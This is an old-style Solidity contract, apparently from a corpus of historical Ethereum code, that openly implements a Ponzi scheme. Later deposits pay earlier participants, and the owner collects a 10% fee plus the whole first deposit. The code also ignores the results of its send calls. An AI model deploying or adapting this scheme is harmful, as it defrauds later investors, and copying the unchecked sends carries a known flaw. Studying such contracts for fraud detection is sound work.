['contract UfoPonzi {\n', '\n', '    struct Participant {\n', '        address etherAddress;\n', '        uint amount;\n', '    }\n', '\n', '    Participant[] public participants;\n', '\n', '    uint public payoutIdx = 0;\n', '    uint public collectedFees;\n', '    uint public balance = 0;\n', '\n', '    address public owner;\n', '\n', '    // simple single-sig function modifier\n', '    modifier onlyowner { if (msg.sender == owner) _ }\n', '\n', '    // this function is executed at initialization and sets the owner of the contract\n', '    function UfoPonzi() {\n', '        owner = msg.sender;\n', '        balance += msg.value;\n', '    }\n', '\n', '    // fallback function - simple transactions trigger this\n', '    function() {\n', '        enter();\n', '    }\n', '    \n', '    function enter() {\n', '        if (msg.value < 1 ether) {\n', '            msg.sender.send(msg.value);\n', '            return;\n', '        }\n', '\n', '        // add a new participant to array\n', '        uint idx = participants.length;\n', '        participants.length += 1;\n', '        participants[idx].etherAddress = msg.sender;\n', '        participants[idx].amount = msg.value;\n', '        \n', '        // collect fees and update contract balance\n', '        if (idx != 0) {\n', '            collectedFees += msg.value / 10;\n', '            balance += msg.value;\n', '        } \n', '        else {\n', '            // first participant has no one above him,\n', '            // so it goes all to fees\n', '            collectedFees += msg.value;\n', '        }\n', '\n', '  // if there are enough ether on the balance we can pay out to an earlier participant\n', '        if (balance > participants[payoutIdx].amount / 10 + participants[payoutIdx].amount) {\n', '            uint transactionAmount = (participants[payoutIdx].amount - participants[payoutIdx].amount / 10) / 10 + (participants[payoutIdx].amount - participants[payoutIdx].amount / 10);\n', '            participants[payoutIdx].etherAddress.send(transactionAmount);\n', '\n', '            balance -= participants[payoutIdx].amount / 10 + participants[payoutIdx].amount;\n', '            payoutIdx += 1;\n', '        }\n', '    }\n', '\n', '    function collectFees() onlyowner {\n', '        if (collectedFees == 0) return;\n', '\n', '        owner.send(collectedFees);\n', '        collectedFees = 0;\n', '    }\n', '\n', '    function setOwner(address _owner) onlyowner {\n', '        owner = _owner;\n', '    }\n', '}']